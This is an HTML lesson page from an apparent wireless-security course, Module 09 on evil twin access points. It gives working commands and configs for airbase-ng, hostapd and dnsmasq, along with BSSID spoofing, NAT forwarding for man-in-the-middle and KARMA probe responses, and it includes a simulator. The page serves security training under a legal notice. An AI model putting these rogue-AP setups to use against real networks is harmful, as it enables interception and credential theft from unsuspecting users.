@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Module 09 — Evil Twin Access Points | WiFi Exploitation Course</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg:#0d1117; --bg-card:#161b22; --bg-code:#010409; --border:#30363d;
+      --accent:#58a6ff; --accent2:#3fb950; --accent3:#f78166; --warn:#d29922;
+      --text:#c9d1d9; --text-dim:#8b949e; --text-head:#e6edf3;
+      --radius:8px; --font-mono:'Cascadia Code','Fira Code','Consolas',monospace;
+      --font-body:'Segoe UI',system-ui,sans-serif;
+    }
+    html { scroll-behavior: smooth; }
+    body { background:var(--bg); color:var(--text); font-family:var(--font-body); line-height:1.7; font-size:15px; }
+    .page-wrapper { display:flex; min-height:100vh; }
+
+    aside.sidebar { width:260px; min-width:260px; background:var(--bg-card); border-right:1px solid var(--border); padding:24px 0; position:sticky; top:0; height:100vh; overflow-y:auto; }
+    .sidebar-logo { padding:0 20px 24px; border-bottom:1px solid var(--border); }
+    .sidebar-logo .course-title { font-size:11px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); margin-bottom:6px; }
+    .sidebar-logo h2 { font-size:14px; color:var(--accent); font-weight:600; }
+    .sidebar-nav { padding:16px 0; }
+    .sidebar-section-label { font-size:10px; text-transform:uppercase; letter-spacing:1.5px; color:var(--text-dim); padding:12px 20px 6px; }
+    .sidebar-nav a { display:flex; align-items:center; gap:10px; padding:7px 20px; color:var(--text-dim); text-decoration:none; font-size:13px; transition:all 0.15s; border-left:2px solid transparent; }
+    .sidebar-nav a:hover { color:var(--text); background:rgba(88,166,255,0.05); }
+    .sidebar-nav a.active { color:var(--accent); border-left-color:var(--accent); background:rgba(88,166,255,0.08); }
+    .sidebar-nav a .mod-num { font-size:10px; background:var(--border); border-radius:4px; padding:2px 6px; font-family:var(--font-mono); min-width:28px; text-align:center; }
+    .sidebar-nav a.active .mod-num { background:rgba(88,166,255,0.2); color:var(--accent); }
+
+    main { flex:1; padding:48px 64px; max-width:960px; }
+
+    .module-header { margin-bottom:40px; }
+    .breadcrumb { font-size:12px; color:var(--text-dim); margin-bottom:12px; }
+    .breadcrumb a { color:var(--accent); text-decoration:none; }
+    .module-badge { display:inline-flex; align-items:center; gap:8px; background:rgba(88,166,255,0.12); border:1px solid rgba(88,166,255,0.3); border-radius:20px; padding:4px 14px; font-size:12px; color:var(--accent); margin-bottom:16px; }
+    .module-header h1 { font-size:2.2rem; color:var(--text-head); line-height:1.2; margin-bottom:12px; }
+    .module-header .subtitle { font-size:16px; color:var(--text-dim); max-width:640px; }
+    .meta-row { display:flex; gap:24px; margin-top:20px; flex-wrap:wrap; }
+    .meta-pill { display:flex; align-items:center; gap:6px; font-size:12px; color:var(--text-dim); }
+    .meta-pill .dot { width:8px; height:8px; border-radius:50%; }
+
+    .warning-box { background:rgba(210,153,34,0.08); border:1px solid rgba(210,153,34,0.4); border-radius:var(--radius); padding:16px 20px; margin-bottom:36px; display:flex; gap:12px; }
+    .warning-box p { font-size:13px; color:var(--warn); line-height:1.6; }
+    .warning-box strong { color:#e3b341; }
+
+    section { margin-bottom:52px; }
+    section h2 { font-size:1.35rem; color:var(--text-head); margin-bottom:16px; padding-bottom:8px; border-bottom:1px solid var(--border); display:flex; align-items:center; gap:10px; }
+    section h2 .section-num { font-size:12px; color:var(--accent); font-family:var(--font-mono); background:rgba(88,166,255,0.1); border-radius:4px; padding:2px 8px; }
+    section h3 { font-size:1.05rem; color:var(--text-head); margin:24px 0 10px; }
+    p { margin-bottom:12px; }
+
+    .terminal { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; font-family:var(--font-mono); font-size:13px; }
+    .terminal-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .terminal-dots { display:flex; gap:6px; }
+    .terminal-dots span { width:10px; height:10px; border-radius:50%; }
+    .d-red { background:#f78166; } .d-yellow { background:#e3b341; } .d-green { background:#3fb950; }
+    .terminal-title { font-size:11px; color:var(--text-dim); }
+    .terminal-copy { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; font-family:var(--font-body); transition:all 0.15s; }
+    .terminal-copy:hover { border-color:var(--accent); color:var(--accent); }
+    .terminal-copy.copied { border-color:var(--accent2); color:var(--accent2); }
+    .terminal-body { padding:16px 18px; overflow-x:auto; line-height:1.9; color:#c9d1d9; white-space:pre-wrap; }
+    .prompt { color:var(--accent2); user-select:none; }
+    .cmd { color:#e6edf3; }
+    .flag { color:#ffa657; }
+    .str { color:#a5d6ff; }
+    .cmt { color:#6e7681; font-style:italic; }
+    .out { color:var(--text-dim); }
+    .out-ok { color:var(--accent2); }
+    .out-warn { color:var(--warn); }
+    .out-err { color:var(--accent3); }
+
+    .table-wrap { overflow-x:auto; margin:20px 0; border-radius:var(--radius); border:1px solid var(--border); }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    thead tr { background:rgba(88,166,255,0.06); }
+    th { padding:10px 14px; text-align:left; color:var(--accent); font-weight:600; font-size:11px; text-transform:uppercase; letter-spacing:0.8px; border-bottom:1px solid var(--border); }
+    td { padding:10px 14px; border-bottom:1px solid rgba(48,54,61,0.6); vertical-align:top; }
+    tr:last-child td { border-bottom:none; }
+    tr:hover td { background:rgba(88,166,255,0.03); }
+    code { font-family:var(--font-mono); font-size:12px; background:rgba(110,118,129,0.15); padding:2px 6px; border-radius:4px; color:#79c0ff; }
+
+    .callout { border-radius:var(--radius); padding:14px 18px; margin:16px 0; display:flex; gap:12px; font-size:13px; line-height:1.6; }
+    .callout.info { background:rgba(88,166,255,0.07); border-left:3px solid var(--accent); }
+    .callout.attack { background:rgba(247,129,102,0.07); border-left:3px solid var(--accent3); }
+    .callout.tip { background:rgba(63,185,80,0.07); border-left:3px solid var(--accent2); }
+    .callout.warn { background:rgba(210,153,34,0.07); border-left:3px solid var(--warn); }
+    .callout .ci { flex-shrink:0; font-size:16px; }
+    .callout strong { color:var(--text-head); }
+
+    /* Attack flow diagram */
+    .attack-flow { display:flex; align-items:center; gap:0; margin:20px 0; flex-wrap:wrap; }
+    .flow-step { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:14px 18px; min-width:140px; text-align:center; }
+    .flow-step .step-num { font-size:10px; color:var(--accent); font-family:var(--font-mono); margin-bottom:4px; text-transform:uppercase; letter-spacing:1px; }
+    .flow-step .step-label { font-size:12px; color:var(--text-head); font-weight:600; }
+    .flow-step .step-tool { font-size:11px; color:var(--text-dim); margin-top:4px; font-family:var(--font-mono); }
+    .flow-arrow { font-size:20px; color:var(--accent); padding:0 8px; user-select:none; }
+
+    /* Config block */
+    .config-block { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:16px 0; }
+    .config-bar { background:#161b22; border-bottom:1px solid var(--border); padding:8px 14px; display:flex; align-items:center; gap:10px; }
+    .config-bar span { font-size:11px; color:var(--text-dim); font-family:var(--font-mono); }
+    .config-bar button { margin-left:auto; background:none; border:1px solid var(--border); border-radius:4px; padding:3px 10px; color:var(--text-dim); font-size:11px; cursor:pointer; transition:all 0.15s; }
+    .config-bar button:hover { border-color:var(--accent); color:var(--accent); }
+    .config-bar button.copied { border-color:var(--accent2); color:var(--accent2); }
+    .config-body { padding:16px 18px; font-family:var(--font-mono); font-size:13px; line-height:1.9; white-space:pre-wrap; }
+    .cfg-key { color:#ffa657; }
+    .cfg-val { color:#a5d6ff; }
+    .cfg-comment { color:#6e7681; font-style:italic; }
+    .cfg-section { color:#3fb950; font-weight:600; }
+
+    /* Evil Twin simulator */
+    .et-sim { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:24px; margin:20px 0; }
+    .et-sim h3 { font-size:14px; color:var(--text-head); margin-bottom:16px; }
+    .sim-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-bottom:20px; }
+    @media (max-width:600px) { .sim-grid { grid-template-columns:1fr; } }
+    .sim-field { display:flex; flex-direction:column; gap:6px; }
+    .sim-field label { font-size:11px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; }
+    .sim-field input, .sim-field select { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:7px 12px; color:var(--text); font-size:13px; font-family:var(--font-body); outline:none; }
+    .sim-field input:focus, .sim-field select:focus { border-color:var(--accent); }
+    .sim-actions { display:flex; gap:10px; margin-bottom:16px; flex-wrap:wrap; }
+    .sim-btn { padding:8px 20px; background:var(--accent); border:none; border-radius:6px; color:#0d1117; font-weight:700; font-size:13px; cursor:pointer; font-family:var(--font-body); transition:all 0.2s; }
+    .sim-btn:hover { background:#79c0ff; }
+    .sim-btn.danger { background:var(--accent3); }
+    .sim-btn.danger:hover { background:#ff9580; }
+    .sim-output { background:var(--bg-code); border:1px solid var(--border); border-radius:var(--radius); padding:16px; font-family:var(--font-mono); font-size:12px; line-height:1.9; min-height:180px; white-space:pre-wrap; }
+    .sim-clients { margin-top:16px; }
+    .sim-clients h4 { font-size:12px; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.8px; margin-bottom:8px; }
+    .client-list { display:flex; flex-direction:column; gap:6px; }
+    .client-item { display:flex; align-items:center; gap:10px; background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:8px 12px; font-size:12px; font-family:var(--font-mono); }
+    .client-dot { width:8px; height:8px; border-radius:50%; background:var(--accent2); flex-shrink:0; }
+    .client-dot.inactive { background:var(--border); }
+    .client-mac { color:var(--accent); }
+    .client-ip { color:var(--text-dim); }
+    .client-status { margin-left:auto; font-size:11px; }
+    .status-connected { color:var(--accent2); }
+    .status-deauthed { color:var(--accent3); }
+
+    /* KARMA diagram */
+    .karma-diagram { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin:16px 0; }
+    .karma-row { display:flex; align-items:center; gap:12px; margin:8px 0; font-size:13px; font-family:var(--font-mono); }
+    .karma-device { background:rgba(88,166,255,0.1); border:1px solid rgba(88,166,255,0.3); border-radius:6px; padding:6px 12px; color:var(--accent); white-space:nowrap; }
+    .karma-device.attacker { background:rgba(247,129,102,0.1); border-color:rgba(247,129,102,0.3); color:var(--accent3); }
+    .karma-msg { color:var(--text-dim); font-size:12px; }
+    .karma-arrow { color:var(--accent2); }
+
+    /* Nav footer */
+    .nav-footer { display:flex; justify-content:space-between; align-items:center; padding:32px 0 0; border-top:1px solid var(--border); margin-top:48px; }
+    .nav-btn { display:inline-flex; align-items:center; gap:8px; padding:10px 20px; border-radius:var(--radius); text-decoration:none; font-size:13px; font-weight:600; transition:all 0.2s; }
+    .nav-btn.next { background:var(--accent); color:#0d1117; }
+    .nav-btn.next:hover { background:#79c0ff; }
+    .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
+    .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
+
+    ::-webkit-scrollbar { width:6px; height:6px; }
+    ::-webkit-scrollbar-track { background:var(--bg); }
+    ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
+    ::-webkit-scrollbar-thumb:hover { background:var(--text-dim); }
+
+    @media (max-width:900px) { aside.sidebar { display:none; } main { padding:24px 20px; } }
+  </style>
+</head>
+<body>
+<div class="page-wrapper">
+
+  <!-- Sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="course-title">WiFi Exploitation Course</div>
+      <h2>Wireless Security</h2>
+    </div>
+    <nav class="sidebar-nav">
+      <div class="sidebar-section-label">Tier 1 — Foundations</div>
+      <a href="../module-00-foundations/"><span class="mod-num">00</span> 802.11 Foundations</a>
+      <a href="../module-01-linux-wireless-setup/"><span class="mod-num">01</span> Linux Wireless Setup</a>
+      <a href="../module-02-monitor-mode/"><span class="mod-num">02</span> Monitor Mode</a>
+      <div class="sidebar-section-label">Tier 2 — Recon</div>
+      <a href="../module-03-reconnaissance/"><span class="mod-num">03</span> Reconnaissance</a>
+      <a href="../module-04-packet-analysis/"><span class="mod-num">04</span> Packet Analysis</a>
+      <div class="sidebar-section-label">Tier 3 — Legacy</div>
+      <a href="../module-05-wep-cracking/"><span class="mod-num">05</span> WEP Cracking</a>
+      <div class="sidebar-section-label">Tier 4 — WPA2-Personal</div>
+      <a href="../module-06-wpa2-handshake/"><span class="mod-num">06</span> WPA2 Handshake</a>
+      <a href="../module-07-wpa2-cracking/"><span class="mod-num">07</span> WPA2 Cracking</a>
+      <div class="sidebar-section-label">Tier 5 — Active Attacks</div>
+      <a href="../module-08-deauth-dos/"><span class="mod-num">08</span> Deauth &amp; DoS</a>
+      <div class="sidebar-section-label">Tier 6 — Rogue AP</div>
+      <a href="#" class="active"><span class="mod-num">09</span> Evil Twin</a>
+      <a href="../module-10-captive-portal/"><span class="mod-num">10</span> Captive Portal</a>
+      <div class="sidebar-section-label">Tier 7 — WPS</div>
+      <a href="../module-11-wps-attacks/"><span class="mod-num">11</span> WPS Attacks</a>
+      <div class="sidebar-section-label">Tier 8 — Modern</div>
+      <a href="../module-12-pmkid-attack/"><span class="mod-num">12</span> PMKID Attack</a>
+      <a href="../module-13-enterprise-wpa/"><span class="mod-num">13</span> WPA-Enterprise</a>
+      <div class="sidebar-section-label">Tier 9 — Chaining</div>
+      <a href="../module-14-attack-chaining/"><span class="mod-num">14</span> Attack Chaining</a>
+    </nav>
+  </aside>
+
+  <main>
+    <div class="module-header">
+      <div class="breadcrumb"><a href="../">WiFi Exploitation Course</a> / Module 09</div>
+      <div class="module-badge">&#9679; Tier 6 &mdash; Rogue AP &amp; Social Engineering</div>
+      <h1>Evil Twin Access Points</h1>
+      <p class="subtitle">Set up rogue access points that impersonate legitimate networks, configure DHCP/DNS services, and force clients to connect using KARMA and deauth-driven attacks.</p>
+      <div class="meta-row">
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> Advanced</div>
+        <div class="meta-pill"><span class="dot" style="background:#58a6ff"></span> ~50 min</div>
+        <div class="meta-pill"><span class="dot" style="background:#f78166"></span> 2 adapters recommended</div>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <p><strong>Legal Notice:</strong> Evil Twin attacks must only be performed on networks you own or have <strong>explicit written authorization</strong> to test. Creating a rogue AP on public or enterprise networks without authorization may violate the CFAA, Computer Misuse Act, and wireless communications regulations.</p>
+    </div>
+
+    <!-- Section 1: How It Works -->
+    <section id="how">
+      <h2><span class="section-num">01</span> How Evil Twin Attacks Work</h2>
+      <p>An Evil Twin is a rogue AP that impersonates a legitimate one by broadcasting an identical SSID — and optionally spoofing the BSSID. Clients connect to the attacker instead of the real network.</p>
+
+      <div class="callout attack">
+        <span class="ci">&#9889;</span>
+        <div><strong>Core weakness:</strong> 802.11 clients choose APs by SSID name and signal strength. They cannot cryptographically verify AP identity on open or WPA2-Personal networks. An attacker who matches the SSID and boosts signal wins the client.</div>
+      </div>
+
+      <h3>Full Attack Flow</h3>
+      <div class="attack-flow">
+        <div class="flow-step">
+          <div class="step-num">Step 1</div>
+          <div class="step-label">Recon</div>
+          <div class="step-tool">airodump-ng</div>
+        </div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-step">
+          <div class="step-num">Step 2</div>
+          <div class="step-label">Rogue AP</div>
+          <div class="step-tool">hostapd</div>
+        </div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-step">
+          <div class="step-num">Step 3</div>
+          <div class="step-label">DHCP/DNS</div>
+          <div class="step-tool">dnsmasq</div>
+        </div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-step">
+          <div class="step-num">Step 4</div>
+          <div class="step-label">Deauth</div>
+          <div class="step-tool">aireplay-ng</div>
+        </div>
+        <div class="flow-arrow">&#8594;</div>
+        <div class="flow-step">
+          <div class="step-num">Step 5</div>
+          <div class="step-label">Client Connects</div>
+          <div class="step-tool">iptables / MITM</div>
+        </div>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Attack Goal</th><th>Technique</th><th>Next Module</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Steal credentials</td><td>Captive portal login page</td><td>Module 10</td></tr>
+            <tr><td>MITM traffic</td><td>NAT forwarding + SSL strip</td><td>Module 10</td></tr>
+            <tr><td>Enterprise hash theft</td><td>hostapd-wpe rogue RADIUS</td><td>Module 13</td></tr>
+            <tr><td>Handshake capture</td><td>WPA2-PSK rogue AP</td><td>Module 06</td></tr>
+            <tr><td>Denial of Service</td><td>Non-functional rogue AP</td><td>Module 08</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <!-- Section 2: airbase-ng -->
+    <section id="airbase">
+      <h2><span class="section-num">02</span> Quick Rogue AP with airbase-ng</h2>
+      <p><code>airbase-ng</code> creates a rogue AP directly from monitor mode — no config file needed. It exposes a virtual <code>at0</code> tap interface for traffic handling.</p>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Open rogue AP with BSSID spoofing</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-airbase1')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-airbase1"><span class="cmt"># Put second adapter in monitor mode</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airmon-ng start <span class="str">wlan1</span></span>
+
+<span class="cmt"># Create open evil twin with spoofed BSSID</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo macchanger <span class="flag">-m</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan1</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airbase-ng <span class="flag">-e</span> <span class="str">"CoffeeShop"</span> <span class="flag">-a</span> <span class="str">AA:BB:CC:DD:EE:FF</span> <span class="flag">-c</span> <span class="str">6</span> wlan1mon</span>
+
+<span class="out-ok">22:00:00  Created tap interface at0</span>
+<span class="out-ok">22:00:01  Access Point with BSSID AA:BB:CC:DD:EE:FF started.</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Configure at0 interface IP</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-airbase2')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-airbase2"><span class="cmt"># Bring up tap interface and assign IP</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo ip addr add <span class="str">10.0.0.1/24</span> dev <span class="str">at0</span></span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo ip link set <span class="str">at0</span> up</span>
+
+<span class="cmt"># Verify</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">ip addr show at0</span>
+<span class="out">3: at0: &lt;BROADCAST,MULTICAST,UP&gt; mtu 1500</span>
+<span class="out">    inet 10.0.0.1/24 scope global at0</span></div>
+      </div>
+
+      <div class="callout info">
+        <span class="ci">&#128161;</span>
+        <div><strong>airbase-ng vs hostapd:</strong> <code>airbase-ng</code> is quick to deploy but limited in features. <code>hostapd</code> supports WPA2-Enterprise, 802.11n/ac beaconing, and is required for most advanced attacks in Modules 10 and 13.</div>
+      </div>
+    </section>
+
+    <!-- Section 3: hostapd -->
+    <section id="hostapd">
+      <h2><span class="section-num">03</span> Production Rogue AP with hostapd</h2>
+      <p><code>hostapd</code> is the standard Linux software AP daemon and supports open, WPA2-Personal, and WPA2-Enterprise modes.</p>
+
+      <div class="config-block">
+        <div class="config-bar">
+          <span>&#128196; /etc/hostapd/evil-twin.conf</span>
+          <button onclick="copyConfig(this,'copy-hostapdconf')">Copy</button>
+        </div>
+        <div class="config-body" id="copy-hostapdconf"><span class="cfg-comment"># Evil twin hostapd configuration</span>
+<span class="cfg-key">interface</span>=<span class="cfg-val">wlan1</span>          <span class="cfg-comment"># AP interface</span>
+<span class="cfg-key">driver</span>=<span class="cfg-val">nl80211</span>         <span class="cfg-comment"># Modern Linux driver</span>
+<span class="cfg-key">ssid</span>=<span class="cfg-val">CoffeeShop</span>         <span class="cfg-comment"># Match target SSID exactly</span>
+<span class="cfg-key">hw_mode</span>=<span class="cfg-val">g</span>              <span class="cfg-comment"># 802.11g (2.4 GHz)</span>
+<span class="cfg-key">channel</span>=<span class="cfg-val">6</span>              <span class="cfg-comment"># Match target channel</span>
+<span class="cfg-key">auth_algs</span>=<span class="cfg-val">1</span>            <span class="cfg-comment"># Open authentication</span>
+<span class="cfg-key">wpa</span>=<span class="cfg-val">0</span>                  <span class="cfg-comment"># No WPA (open network)</span>
+<span class="cfg-key">beacon_int</span>=<span class="cfg-val">100</span>         <span class="cfg-comment"># Beacon interval (ms)</span>
+<span class="cfg-key">max_num_sta</span>=<span class="cfg-val">255</span>        <span class="cfg-comment"># Max connected clients</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Start hostapd &amp; spoof BSSID</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-hostapd1')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-hostapd1"><span class="cmt"># Spoof BSSID before starting hostapd</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo ip link set <span class="str">wlan1</span> down</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo macchanger <span class="flag">-m</span> <span class="str">AA:BB:CC:DD:EE:FF</span> wlan1</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo ip link set <span class="str">wlan1</span> up</span>
+
+<span class="cmt"># Start hostapd</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo hostapd <span class="flag">-d</span> /etc/hostapd/evil-twin.conf</span>
+<span class="out-ok">wlan1: interface state UNINITIALIZED-&gt;ENABLED</span>
+<span class="out-ok">wlan1: AP-ENABLED</span></div>
+      </div>
+    </section>
+
+    <!-- Section 4: dnsmasq -->
+    <section id="dnsmasq">
+      <h2><span class="section-num">04</span> DHCP &amp; DNS with dnsmasq</h2>
+      <p>Victims connecting to your evil twin need an IP address and DNS resolution. <code>dnsmasq</code> provides both in a single lightweight daemon.</p>
+
+      <div class="config-block">
+        <div class="config-bar">
+          <span>&#128196; /etc/dnsmasq_evil.conf</span>
+          <button onclick="copyConfig(this,'copy-dnsmasq')">Copy</button>
+        </div>
+        <div class="config-body" id="copy-dnsmasq"><span class="cfg-comment"># dnsmasq configuration for evil twin</span>
+<span class="cfg-key">interface</span>=<span class="cfg-val">wlan1</span>                       <span class="cfg-comment"># AP interface (or at0 for airbase-ng)</span>
+<span class="cfg-key">no-resolv</span>                               <span class="cfg-comment"># Ignore /etc/resolv.conf</span>
+<span class="cfg-key">server</span>=<span class="cfg-val">8.8.8.8</span>                         <span class="cfg-comment"># Forward DNS to Google</span>
+<span class="cfg-key">dhcp-range</span>=<span class="cfg-val">10.0.0.10,10.0.0.100,12h</span>  <span class="cfg-comment"># IP pool</span>
+<span class="cfg-key">dhcp-option</span>=<span class="cfg-val">3,10.0.0.1</span>               <span class="cfg-comment"># Gateway = us</span>
+<span class="cfg-key">dhcp-option</span>=<span class="cfg-val">6,10.0.0.1</span>               <span class="cfg-comment"># DNS = us</span>
+<span class="cfg-key">log-dhcp</span>                                <span class="cfg-comment"># Log all DHCP assignments</span>
+<span class="cfg-key">log-queries</span>                             <span class="cfg-comment"># Log all DNS queries</span>
+
+<span class="cfg-comment"># Captive portal redirect (uncomment for Module 10)</span>
+<span class="cfg-comment"># address=/#/10.0.0.1</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">Enable NAT routing &amp; start dnsmasq</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-routing')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-routing"><span class="cmt"># Enable IP forwarding</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">echo <span class="str">1</span> | sudo tee /proc/sys/net/ipv4/ip_forward</span>
+
+<span class="cmt"># Set up NAT: wlan0 = internet, wlan1 = evil twin AP</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-t</span> nat <span class="flag">-A</span> POSTROUTING <span class="flag">-o</span> <span class="str">wlan0</span> <span class="flag">-j</span> MASQUERADE</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-A</span> FORWARD <span class="flag">-i</span> <span class="str">wlan1</span> <span class="flag">-o</span> <span class="str">wlan0</span> <span class="flag">-j</span> ACCEPT</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo iptables <span class="flag">-A</span> FORWARD <span class="flag">-i</span> <span class="str">wlan0</span> <span class="flag">-o</span> <span class="str">wlan1</span> <span class="flag">-m</span> state <span class="flag">--state</span> RELATED,ESTABLISHED <span class="flag">-j</span> ACCEPT</span>
+
+<span class="cmt"># Start DHCP/DNS server</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo dnsmasq <span class="flag">-C</span> /etc/dnsmasq_evil.conf <span class="flag">--no-daemon</span></span>
+<span class="out-ok">dnsmasq: started, version 2.89 cachesize 150</span>
+<span class="out-ok">dnsmasq-dhcp: DHCP, IP range 10.0.0.10 -- 10.0.0.100, lease time 12h</span></div>
+      </div>
+    </section>
+
+    <!-- Section 5: KARMA -->
+    <section id="karma">
+      <h2><span class="section-num">05</span> KARMA Attacks</h2>
+      <p>KARMA exploits the 802.11 probe request mechanism: clients broadcast the names of previously connected networks. A KARMA-enabled AP responds to <em>every</em> probe, impersonating whatever network the client seeks.</p>
+
+      <div class="karma-diagram">
+        <div class="karma-row">
+          <div class="karma-device">Client Device</div>
+          <span class="karma-arrow">&#8594;</span>
+          <span class="karma-msg">Probe Request: "Is 'HomeWiFi' nearby?"</span>
+        </div>
+        <div class="karma-row">
+          <div class="karma-device attacker">KARMA AP (attacker)</div>
+          <span class="karma-arrow">&#8592;</span>
+          <span class="karma-msg">Probe Response: "Yes! I am HomeWiFi"</span>
+        </div>
+        <div class="karma-row">
+          <div class="karma-device">Client Device</div>
+          <span class="karma-arrow">&#8594;</span>
+          <span class="karma-msg">Association Request &#8594; client connects automatically</span>
+        </div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">KARMA mode with airbase-ng</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-karma')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-karma"><span class="cmt"># Step 1: Collect probe requests passively</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airodump-ng <span class="flag">--output-format</span> csv <span class="flag">--write</span> <span class="str">probes</span> wlan1mon</span>
+
+<span class="cmt"># Step 2: Launch KARMA — respond to ALL probe requests</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo airbase-ng <span class="flag">-P</span> <span class="flag">-C</span> <span class="str">30</span> <span class="flag">-e</span> <span class="str">"default"</span> wlan1mon</span>
+
+<span class="cmt"># -P    Respond to all probe requests (KARMA mode)</span>
+<span class="cmt"># -C 30 Broadcast each discovered SSID for 30 seconds</span>
+<span class="cmt"># -e    Fallback SSID if no probes seen</span>
+
+<span class="out-ok">Responding to probe for SSID 'HomeWiFi' from 11:22:33:44:55:66</span>
+<span class="out-ok">Responding to probe for SSID 'Airport_Free_WiFi' from 22:33:44:55:66:77</span></div>
+      </div>
+
+      <div class="callout warn">
+        <span class="ci">&#9888;</span>
+        <div><strong>Modern KARMA limitations:</strong> iOS 14+, Android 10+, and Windows 10+ have randomized MAC addresses and send fewer directed probe requests. They use "wildcard" probes (empty SSID) instead. KARMA is still effective against older devices and corporate endpoints running unpatched drivers.</div>
+      </div>
+    </section>
+
+    <!-- Section 6: Evil Twin Simulator -->
+    <section id="simulator">
+      <h2><span class="section-num">06</span> Evil Twin Attack Simulator</h2>
+      <p>Simulate a complete evil twin attack workflow — from rogue AP creation to client capture.</p>
+
+      <div class="et-sim">
+        <h3>&#128301; Evil Twin Attack Simulator</h3>
+        <div class="sim-grid">
+          <div class="sim-field">
+            <label>Target SSID</label>
+            <input type="text" id="targetSSID" value="CoffeeShop" placeholder="Target network name" />
+          </div>
+          <div class="sim-field">
+            <label>Target BSSID</label>
+            <input type="text" id="targetBSSID" value="AA:BB:CC:DD:EE:FF" placeholder="AP MAC address" />
+          </div>
+          <div class="sim-field">
+            <label>Channel</label>
+            <select id="targetChannel">
+              <option value="1">Channel 1</option>
+              <option value="6" selected>Channel 6</option>
+              <option value="11">Channel 11</option>
+            </select>
+          </div>
+          <div class="sim-field">
+            <label>Attack Mode</label>
+            <select id="attackMode">
+              <option value="open">Open AP (MITM)</option>
+              <option value="karma">KARMA Mode</option>
+              <option value="wpa2">WPA2-PSK Clone</option>
+            </select>
+          </div>
+        </div>
+        <div class="sim-actions">
+          <button class="sim-btn" onclick="startEvilTwin()">&#9889; Launch Evil Twin</button>
+          <button class="sim-btn danger" onclick="deauthVictims()">&#128250; Deauth Clients</button>
+          <button class="sim-btn" style="background:var(--bg);border:1px solid var(--border);color:var(--text-dim);" onclick="resetSim()">Reset</button>
+        </div>
+        <div class="sim-output" id="etOutput"><span style="color:var(--text-dim);">Configure the attack above and click "Launch Evil Twin" to begin...</span></div>
